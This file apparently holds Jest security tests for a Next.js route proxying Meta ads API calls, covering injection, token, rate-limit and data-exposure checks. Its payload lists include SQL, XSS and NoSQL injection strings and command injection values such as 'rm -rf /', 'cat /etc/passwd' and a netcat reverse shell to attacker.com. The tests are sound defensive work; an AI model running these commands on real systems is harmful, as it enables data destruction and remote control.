import { NextRequest } from 'next/server'

// Mock the API route for security testing
jest.mock('@/lib/server-protection', () => ({
  safeJsonParse: jest.fn((response) => response.json()),
  withTimeout: jest.fn((promise) => promise),
}))

describe('Security Tests', () => {
  describe('Input Validation and Sanitization', () => {
    it('should reject SQL injection attempts', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "'; UPDATE users SET password='hacked'; --",
        "1; DELETE FROM campaigns; --",
        "1' UNION SELECT * FROM users; --"
      ]

      // Test each SQL injection payload
      for (const payload of sqlInjectionPayloads) {
        const requestBody = {
          type: 'test_connection',
          accessToken: payload,
          adAccountId: 'act_123456789'
        }

        // Mock the POST route
        const { POST } = await import('@/app/api/meta/route')
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        const data = await response.json()

        // Should reject malicious input
        expect(response.status).toBe(400)
        expect(data.error).toBeDefined()
        expect(data.error).not.toContain('DROP TABLE')
        expect(data.error).not.toContain('DELETE')
        expect(data.error).not.toContain('UPDATE')
      }
    })

    it('should reject XSS attempts', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>',
        "'; alert('xss'); //",
        '<iframe src="javascript:alert(1)"></iframe>'
      ]

      for (const payload of xssPayloads) {
        const requestBody = {
          type: 'test_connection',
          accessToken: payload,
          adAccountId: 'act_123456789'
        }

        const { POST } = await import('@/app/api/meta/route')
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        const data = await response.json()

        // Should reject XSS attempts
        expect(response.status).toBe(400)
        expect(data.error).toBeDefined()
        // Ensure XSS payload is not reflected back
        expect(data.error).not.toContain('<script>')
        expect(data.error).not.toContain('alert')
        expect(data.error).not.toContain('javascript:')
        expect(data.error).not.toContain('<img')
        expect(data.error).not.toContain('<svg')
        expect(data.error).not.toContain('<iframe')
      }
    })

    it('should reject NoSQL injection attempts', async () => {
      const nosqlPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$exists": true}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{$eval: "function() { return true; }"}',
        '{"$or": [{"password": {"$exists": true}}]}'
      ]

      for (const payload of nosqlPayloads) {
        const requestBody = {
          type: 'test_connection',
          accessToken: payload,
          adAccountId: 'act_123456789'
        }

        const { POST } = await import('@/app/api/meta/route')
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toBeDefined()
        expect(data.error).not.toContain('$gt')
        expect(data.error).not.toContain('$ne')
        expect(data.error).not.toContain('$exists')
        expect(data.error).not.toContain('$where')
        expect(data.error).not.toContain('$eval')
      }
    })

    it('should reject command injection attempts', async () => {
      const commandInjectionPayloads = [
        '; cat /etc/passwd',
        '| whoami',
        '&& rm -rf /',
        '`curl evil.com`',
        '$(wget evil.com)',
        '; nc -e /bin/sh attacker.com 4444',
        '| python -c "import os; os.system(\'ls\')"'
      ]

      for (const payload of commandInjectionPayloads) {
        const requestBody = {
          type: 'test_connection',
          accessToken: `valid_token_123456789012345${payload}`,
          adAccountId: 'act_123456789'
        }

        const { POST } = await import('@/app/api/meta/route')
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        
        // Should handle safely without executing commands
        expect([400, 401, 500]).toContain(response.status)
      }
    })
  })

  describe('Authentication and Authorization', () => {
    it('should reject requests with invalid tokens', async () => {
      const invalidTokens = [
        '',
        'short',
        'invalid_token_format',
        'Bearer ',
        '   ',
        null,
        undefined
      ]

      for (const token of invalidTokens) {
        const requestBody = {
          type: 'test_connection',
          accessToken: token,
          adAccountId: 'act_123456789'
        }

        const { POST } = await import('@/app/api/meta/route')
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        expect(response.status).toBe(400)
      }
    })

    it('should properly strip Bearer prefix from tokens', async () => {
      const tokenWithBearer = 'Bearer EAABwzLixnjYBAtest123456789012345'
      const expectedCleanToken = 'EAABwzLixnjYBAtest123456789012345'

      // Mock fetch to intercept the cleaned token
      global.fetch = jest.fn().mockImplementation((url) => {
        expect(url).toContain(expectedCleanToken)
        expect(url).not.toContain('Bearer')
        
        return Promise.resolve({
          ok: true,
          json: () => Promise.resolve({
            id: 'act_123456789',
            name: 'Test Account',
            account_status: 1,
            currency: 'USD',
            timezone_name: 'America/New_York'
          })
        })
      })

      const requestBody = {
        type: 'test_connection',
        accessToken: tokenWithBearer,
        adAccountId: 'act_123456789'
      }

      const { POST } = await import('@/app/api/meta/route')
      const request = new NextRequest('http://localhost:3000/api/meta', {
        method: 'POST',
        body: JSON.stringify(requestBody),
        headers: { 'content-type': 'application/json' }
      })

      await POST(request)
      expect(fetch).toHaveBeenCalled()
    })

    it('should validate account ID format', async () => {
      const invalidAccountIds = [
        '123456789', // Missing act_ prefix
        'act_', // Empty after prefix
        'act_abc123', // Contains letters
        'act_123_456', // Contains underscore
        'wrong_123456789', // Wrong prefix
        'ACT_123456789', // Wrong case
        '', // Empty string
        null, // Null value
        undefined // Undefined value
      ]

      for (const accountId of invalidAccountIds) {
        const requestBody = {
          type: 'test_connection',
          accessToken: 'EAABwzLixnjYBAtest123456789012345',
          adAccountId: accountId
        }

        const { POST } = await import('@/app/api/meta/route')
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        expect(response.status).toBe(400)
      }
    })
  })

  describe('Rate Limiting Security', () => {
    it('should implement rate limiting to prevent abuse', async () => {
      const requestBody = {
        type: 'test_connection',
        accessToken: 'EAABwzLixnjYBAtest123456789012345',
        adAccountId: 'act_123456789'
      }

      const { POST } = await import('@/app/api/meta/route')

      // Mock successful responses for first requests
      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({
          id: 'act_123456789',
          name: 'Test Account'
        })
      })

      const requests = []
      const sameIP = '192.168.1.1'

      // Make multiple requests from same IP
      for (let i = 0; i < 12; i++) {
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: {
            'content-type': 'application/json',
            'x-forwarded-for': sameIP
          }
        })
        requests.push(POST(request))
      }

      const responses = await Promise.all(requests)
      
      // Should start rate limiting after 10 requests (based on validation limit)
      const rateLimitedResponses = responses.filter(r => r.status === 429)
      expect(rateLimitedResponses.length).toBeGreaterThan(0)

      // Rate limited responses should include retry-after info
      for (const response of rateLimitedResponses) {
        const data = await response.json()
        expect(data.retryAfter).toBeDefined()
        expect(data.error).toContain('Too many')
      }
    })

    it('should allow requests from different IPs', async () => {
      const requestBody = {
        type: 'test_connection',
        accessToken: 'EAABwzLixnjYBAtest123456789012345',
        adAccountId: 'act_123456789'
      }

      const { POST } = await import('@/app/api/meta/route')

      global.fetch = jest.fn().mockResolvedValue({
        ok: true,
        json: () => Promise.resolve({
          id: 'act_123456789',
          name: 'Test Account'
        })
      })

      // Make requests from different IPs
      const ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3', '192.168.1.4']
      const responses = []

      for (const ip of ips) {
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: {
            'content-type': 'application/json',
            'x-forwarded-for': ip
          }
        })
        responses.push(await POST(request))
      }

      // All should succeed (no rate limiting across different IPs)
      responses.forEach(response => {
        expect(response.status).not.toBe(429)
      })
    })
  })

  describe('Data Exposure Prevention', () => {
    it('should not expose sensitive data in error messages', async () => {
      const sensitiveData = {
        type: 'test_connection',
        accessToken: 'EAABwzLixnjYBAsensitive_token_123456789',
        adAccountId: 'act_123456789',
        password: 'secret_password',
        apiKey: 'super_secret_api_key',
        sessionId: 'session_12345'
      }

      const { POST } = await import('@/app/api/meta/route')
      const request = new NextRequest('http://localhost:3000/api/meta', {
        method: 'POST',
        body: JSON.stringify(sensitiveData),
        headers: { 'content-type': 'application/json' }
      })

      const response = await POST(request)
      const data = await response.json()

      // Error message should not contain sensitive data
      const errorMessage = JSON.stringify(data)
      expect(errorMessage).not.toContain('sensitive_token')
      expect(errorMessage).not.toContain('secret_password')
      expect(errorMessage).not.toContain('super_secret_api_key')
      expect(errorMessage).not.toContain('session_12345')
    })

    it('should mask tokens in logs', async () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation()

      const requestBody = {
        endpoint: 'campaigns',
        accessToken: 'EAABwzLixnjYBAsensitive_token_123456789',
        params: {}
      }

      const { POST } = await import('@/app/api/meta/route')
      const request = new NextRequest('http://localhost:3000/api/meta', {
        method: 'POST',
        body: JSON.stringify(requestBody),
        headers: { 'content-type': 'application/json' }
      })

      await POST(request)

      // Check that logs don't contain full token
      const logCalls = consoleSpy.mock.calls.flat().join(' ')
      expect(logCalls).not.toContain('sensitive_token_123456789')
      
      // Should contain masked version
      if (logCalls.includes('***')) {
        expect(logCalls).toContain('***')
      }

      consoleSpy.mockRestore()
    })
  })

  describe('Request Validation', () => {
    it('should validate content-type header', async () => {
      const requestBody = {
        type: 'test_connection',
        accessToken: 'EAABwzLixnjYBAtest123456789012345',
        adAccountId: 'act_123456789'
      }

      const { POST } = await import('@/app/api/meta/route')
      
      // Request without proper content-type
      const request = new NextRequest('http://localhost:3000/api/meta', {
        method: 'POST',
        body: JSON.stringify(requestBody),
        headers: { 'content-type': 'text/plain' }
      })

      const response = await POST(request)
      
      // Should either reject or handle gracefully
      expect([200, 400, 415]).toContain(response.status)
    })

    it('should handle large payloads safely', async () => {
      const largePayload = {
        type: 'test_connection',
        accessToken: 'EAABwzLixnjYBAtest123456789012345',
        adAccountId: 'act_123456789',
        largeField: 'x'.repeat(1000000) // 1MB of data
      }

      const { POST } = await import('@/app/api/meta/route')
      const request = new NextRequest('http://localhost:3000/api/meta', {
        method: 'POST',
        body: JSON.stringify(largePayload),
        headers: { 'content-type': 'application/json' }
      })

      const response = await POST(request)
      
      // Should handle gracefully without crashing
      expect([200, 400, 413, 500]).toContain(response.status)
    })

    it('should reject malformed JSON gracefully', async () => {
      const malformedPayloads = [
        'invalid json',
        '{"unclosed": "object"',
        '{"key": }',
        '{key: "value"}', // Missing quotes
        '{"key": "value",}', // Trailing comma
        '{"key": undefined}' // Invalid value
      ]

      const { POST } = await import('@/app/api/meta/route')

      for (const payload of malformedPayloads) {
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: payload,
          headers: { 'content-type': 'application/json' }
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toContain('Invalid JSON')
      }
    })
  })

  describe('User-Agent Validation', () => {
    it('should handle suspicious user agents', async () => {
      const suspiciousUserAgents = [
        '', // Empty user agent
        'bot', // Bot-like user agent
        'curl/7.68.0', // Command line tool
        'wget/1.20.3', // Command line tool
        'python-requests/2.25.1', // Automated script
        'a', // Very short user agent
        'Mozilla/5.0 (compatible; Googlebot/2.1)', // Known bot
        'Mozilla/5.0 (compatible; bingbot/2.0)', // Known bot
      ]

      const requestBody = {
        type: 'test_connection',
        accessToken: 'EAABwzLixnjYBAtest123456789012345',
        adAccountId: 'act_123456789'
      }

      const { POST } = await import('@/app/api/meta/route')

      for (const userAgent of suspiciousUserAgents) {
        const request = new NextRequest('http://localhost:3000/api/meta', {
          method: 'POST',
          body: JSON.stringify(requestBody),
          headers: {
            'content-type': 'application/json',
            'user-agent': userAgent
          }
        })

        const response = await POST(request)
        
        // Should handle but might log warnings
        expect([200, 400, 401, 403]).toContain(response.status)
      }
    })
  })

  describe('HTTP Method Security', () => {
    it('should reject non-POST requests', async () => {
      const { GET } = await import('@/app/api/meta/route')
      const request = new NextRequest('http://localhost:3000/api/meta')

      const response = await GET(request)
      const data = await response.json()

      expect(response.status).toBe(405)
      expect(data.error).toContain('Method not allowed')
    })
  })
})